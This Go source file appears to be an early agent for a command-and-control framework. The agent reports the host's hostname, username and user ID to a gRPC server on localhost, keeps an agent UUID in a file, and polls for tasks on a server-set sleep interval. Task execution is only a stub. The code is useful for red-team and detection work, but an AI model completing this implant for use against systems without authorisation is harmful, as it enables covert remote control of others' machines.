package main

import (
	"context"
	"fmt"
	"io"
	"log"
	"os"
	"os/user"
	"time"

	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"

	pb "github.com/chopper-c2-framework/c2-chopper/grpc/proto"
)

const UUID_FILE = "uuid.test"
const HOST = "localhost:9002"

type Services struct {
	AgentService pb.AgentServiceClient
	TaskService  pb.TaskServiceClient
}

type AgentInfo struct {
	Uuid     string
	Username string
	UserId   string
	Hostname string
}

func loadUUID() (string, error) {
	file, err := os.OpenFile(UUID_FILE, os.O_RDONLY, 0644)
	if err != nil {
		if os.IsNotExist(err) {
			return "", nil
		}

		fmt.Println("Error opening file:", err)
		return "", err
	}
	defer file.Close()

	// Check if the file is empty
	fileInfo, err := file.Stat()
	if err != nil {
		fmt.Println("Error getting file info:", err)
		return "", err
	}

	if fileInfo.Size() == 0 {
		fmt.Println("The file is empty")
		return "", nil
	}

	content, err := io.ReadAll(file)
	if err != nil {
		fmt.Println("Error reading file:", err)
		return "", err
	}

	return string(content), nil
}

func updateUUID(uuid string) {
	os.WriteFile(UUID_FILE, []byte(uuid), 0644)
}

func gRPCConnect() {

}

func Connect(conn *grpc.ClientConn, services *Services) *AgentInfo {
	uuid, _ := loadUUID()
	user, _ := user.Current()
	username := user.Username
	userId := user.Uid
	hostname, _ := os.Hostname()

	fmt.Println(uuid, username, userId)
	fmt.Println("Hostname:", hostname)

	agent := &pb.Agent{
		Hostname: hostname,
		Username: username,
		UserId:   userId,
	}

	if len(uuid) != 0 {
		agent.Id = uuid
	}

	ctx, cancel := context.WithTimeout(context.Background(), time.Second)
	defer cancel()

	response, err := services.AgentService.Connect(ctx, &pb.AgentConnectionRequest{Data: agent})
	if err != nil {
		log.Panic("error registering connection:", err)
		return nil
	}

	newUUID := response.GetUuid()
	fmt.Println(response)

	if newUUID != uuid {
		uuid = newUUID
		updateUUID(newUUID)
	}

	return &AgentInfo{
		Uuid:     uuid,
		Username: username,
		UserId:   userId,
		Hostname: hostname,
	}
}

func InitServices(conn *grpc.ClientConn) *Services {
	AgentService := pb.NewAgentServiceClient(conn)
	TaskService := pb.NewTaskServiceClient(conn)
	return &Services{
		AgentService: AgentService,
		TaskService:  TaskService,
	}
}

func FetchTasks(services *Services, info *AgentInfo) ([]*pb.Task, uint32, error) {
	fmt.Println("Fetching tasks")
	request := &pb.GetAgentTasksRequest{
		AgentId: info.Uuid,
	}

	ctx, cancel := context.WithTimeout(context.Background(), time.Second)
	defer cancel()
	resp, err := services.TaskService.GetAgentTasks(ctx, request)
	if err != nil {
		return nil, 0, err
	}
	return resp.GetTasks(), resp.GetSleepTime(), nil
}

func ExecuteTask(task *pb.Task) (*pb.TaskResult, error) {
	// Handle execution & stuff
	fmt.Println("Executing task", task.Name)
	return &pb.TaskResult{TaskId: task.TaskId}, nil
}

func SendResult(services *Services, result *pb.TaskResult) error {
	fmt.Println("Sending result for task id", result.TaskId)

	request := &pb.CreateTaskResultRequest{
		TaskResult: result,
	}

	ctx, cancel := context.WithTimeout(context.Background(), time.Second)
	defer cancel()
	_, err := services.TaskService.CreateTaskResult(ctx, request)
	return err
}

func main() {
	conn, err := grpc.Dial(HOST, grpc.WithTransportCredentials(insecure.NewCredentials()))
	if err != nil {
		log.Panic("error connecting:", err)
		return
	}
	defer conn.Close()

	services := InitServices(conn)

	info := Connect(conn, services)

	for {
		tasks, sleep, err := FetchTasks(services, info)
		if err != nil {
			log.Panic("Unable to fetch tasks")
		}

		fmt.Println("Fetched", len(tasks), "tasks")

		for _, task := range tasks {
			// This can become multithreaded in the future
			// But will require sync between { SendResult, Sleep } blocks
			result, err := ExecuteTask(task)
			if err != nil {
				log.Panic("Unable to execute task")
			}

			err = SendResult(services, result)
			if err != nil {
				log.Panic("Unable to submit task result")
			}

			time.Sleep(time.Duration(sleep * uint32(time.Second)))
		}
		time.Sleep(time.Duration(sleep * uint32(time.Second)))

	}
}
